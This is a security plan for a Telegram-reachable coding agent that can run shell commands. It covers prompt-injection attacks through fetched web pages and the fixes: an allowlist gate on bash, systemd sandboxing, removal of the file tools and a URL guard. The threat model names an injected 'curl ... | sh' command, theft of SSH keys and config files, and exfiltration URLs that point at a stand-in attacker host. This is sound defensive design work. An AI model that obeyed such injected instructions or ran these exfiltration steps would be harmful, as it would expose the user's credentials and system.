# Security plan: closing the bash free-for-all

Written 2026-09-08. Status: **implemented** — `src/security.ts`, `/allow` in `src/index.ts`,
hardening in `pi-gateway.service`, ungated file-tool exclusion + fetch guard
(issue #82); self-check: `npx tsx tests/security-check.ts`.

## Threat model

GAIA is a Telegram-reachable agent that can run arbitrary bash as the user, with
zero gates. The realistic attack isn't malice — it's **prompt injection**: the
agent fetches arbitrary web pages (`websearch`, `fetchpage`) and feeds them to a
model that can execute shell commands. Injected instructions like "run
`curl ... | sh`" currently just work.

Container/VM/VPS isolation is the textbook fix (and pi's official position —
pi has no built-in sandbox and its docs say real isolation must come from the
OS boundary). But there's a cheaper, complementary layer that doesn't need one.

## The interception point (verified in pi's SDK docs)

- `createAgentSession()` accepts `excludeTools: ["bash"]` and `customTools`.
- So: remove the built-in bash, register our own `bash` tool in its place.
- Every command — any chat, any schedule, any vector — then flows through one
  function we own. Root-cause fix: one guard in the shared path.
- GAIA already centralizes session creation in `src/session.ts`
  (`ChatSessions.get` + `runOneShot`), so there is one place to wire it.

## Plan (3 pieces, in order)

### 1. Deny-by-default bash gate — `src/security.ts` (~50 lines)

- New config key: `"allowedCommands": ["git *", "gh *", "npm test", "ls *", ...]`
  — prefix/pattern matches against the full command string.
- Match → execute exactly like the built-in tool (cwd, captured output, timeout).
- No match → the tool *returns an error to the model*: "command not on the
  allowlist. Ask the user to approve it with /allow." The agent relays that
  naturally since it already reports tool failures in prose.
- Wire into both `ChatSessions.get()` and `runOneShot()` in `src/session.ts`
  (excludeTools: ["bash"] + custom gate tool).

### 2. `/allow <pattern>` chat command — `src/index.ts`

- Appends the pattern to `allowedCommands` in `~/.pi-gateway/config.json`,
  replies with confirmation.
- Replaces Hermes-style interactive y/N approval **deliberately**: the gateway's
  turn loop is serialized (`await session.prompt()` blocks the poll loop), so an
  in-chat "reply y to approve" would deadlock — the approval message can't be
  read until the turn that's waiting for it finishes. Making approvals live
  requires running the poll loop concurrently with turns: a real refactor with
  interleaving risks. `/allow` gets the same security property (human in the
  loop, decision persists) with none of the plumbing.
- Upgrade path: same gate, different UI in front of it, once the loop is
  concurrent.

### 3. systemd hardening — `pi-gateway.service` (~8 lines)

The "no container needed" containment layer. The service file already exists;
add:

```ini
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=%h/.pi-gateway %h/GAIA
PrivateTmp=yes
RestrictSudo=yes
```

- Even a *successful* injection then can't write outside the state/workspace
  dirs, can't escalate, can't touch system paths.
- Gate and sandbox are complementary: the gate decides what ever runs; the
  sandbox limits what a running thing can do.
- Ceiling: container/VM/VPS (pi's docs point at a Gondolin micro-VM
  integration) is still stronger. Overkill for a single-user box today; the
  upgrade path if the agent starts touching untrusted repos.

## Ungated built-in file tools (issue #82)

The bash gate only covers bash. pi ships built-in `read`/`edit`/`write` tools that
resolve absolute paths and `~` with no sandbox and write anywhere the OS user can
(`ReadWritePaths=%h/GAIA` makes the cwd writable). A prompt-injected page could use
them to read `~/.pi-gateway/config.json` / `~/.ssh/id_rsa` (and exfiltrate via
`fetchpage` to a public server) or to rewrite `src/index.ts`/`config.json` for a
persistent backdoor — all without ever touching bash, so neither the gate nor
memory staging engages.

Mitigations (all wired in `src/session.ts` / `src/web.ts`):

- **File tools excluded from sessions.** `createAgentSession` gets
  `excludeTools: ["read", "edit", "write"]`, so every file access flows through
  the `bash` allowlist (our custom `bash` shadows the built-in by name).
  `runOneShot` does the same unless an explicit `tools` allowlist is passed
  (e.g. `/plan` deliberately allows `read` for a trusted one-shot turn).
- **No file-mutation tool survives**, so there is no write channel to tamper with
  `index.ts`/`config.json`; the `allowedChatIds` allow-list and the bash gate
  can't be edited away by the model.
- **`fetchpage` refuses any non-origin URL.** The remaining exfiltration channel
  would be `fetchpage` to a public server carrying a secret in the URL — in the
  query string (`https://attacker/?data=<secret>`), the path
  (`https://attacker/<secret>`), or the fragment (`https://attacker/#<secret>`);
  `safeFetch` only blocks private hosts, so a public server is fine. fetchpage
  now refuses any URL that is not a bare site origin (no path, query, or
  fragment — websearch posts its query in the body and is unaffected), and with
  `read` excluded the model has no secret source to leak anyway.

Ceiling: still a container/VM/VPS (pi's docs point at a Gondolin micro-VM).

## Explicitly skipped

- **Deny-lists** — the allowlist subsumes them.
- **DM pairing** — `allowedChatIds` already is that.
- **Live y/N approval** — deadlocks against the serialized turn loop (see #2).
  (`/allow` and the memory gate are the interactive paths instead.)
- **Per-tool policies beyond bash** — superseded by issue #82: read/edit/write are
  excluded outright, which is stricter than any per-file policy; bash remains the
  escalation vector and keeps the gate.

## Verification

- `npx tsc --noEmit`
- Small self-check: non-allowlisted command returns the refusal error;
  allowlisted command still executes.
- After service edit: `systemctl --user daemon-reload && systemctl --user restart pi-gateway`
  and confirm the agent still runs allowlisted commands.
